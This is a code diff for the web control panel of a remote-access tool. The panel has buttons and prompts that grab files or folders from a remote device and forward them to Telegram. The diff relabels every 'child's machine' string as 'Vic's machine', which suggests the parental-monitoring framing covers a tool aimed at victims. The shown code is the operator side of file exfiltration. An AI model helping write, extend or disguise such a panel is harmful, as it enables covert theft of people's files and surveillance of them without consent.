@@ -723,7 +723,7 @@ body {
                     <!-- Grab from child + send -->
                     <button class="btn-ctrl success" style="width:100%;font-size:10px;"
                             onclick="tgGrabAndSendFromChild()"
-                            title="Grab a file from the child's machine and send it to Telegram">
+                            title="Grab a file from the Vic's machine and send it to Telegram">
                         <i class="fas fa-download"></i> Grab &amp; Send from Child
                     </button>
                 </div>
@@ -1880,7 +1880,7 @@ function formatBytes(n) {
 async function rcFetchFilePrompt() {
     if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
     const path = prompt(
-        "Absolute path on the child's machine to grab:\n" +
+        "Absolute path on the Vic's machine to grab:\n" +
         "Example: C:\\Users\\Kid\\Desktop\\homework.pdf"
     );
     if (!path) return;
@@ -2005,7 +2005,7 @@ async function _waitForReceivedFile(base, timeoutMs = 8000) {
 async function rcFetchFolderPrompt() {
     if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
     const path = prompt(
-        "Folder on the child's machine:\n" +
+        "Folder on the Vic's machine:\n" +
         "Example: C:\\Users\\Kid\\Documents"
     );
     if (!path) return;
@@ -2535,7 +2535,7 @@ async function tgPickAndSendReceivedFile() {
 async function tgGrabAndSendFromChild() {
     if (!currentDeviceId) { toast('Select a device first', 'warn'); return; }
     const path = prompt(
-        "Absolute path on the child's machine to grab & send:\n" +
+        "Absolute path on the Vic's machine to grab & send:\n" +
         "Example: C:\\Users\\Kid\\Desktop\\homework.pdf"
     );
     if (!path) return;
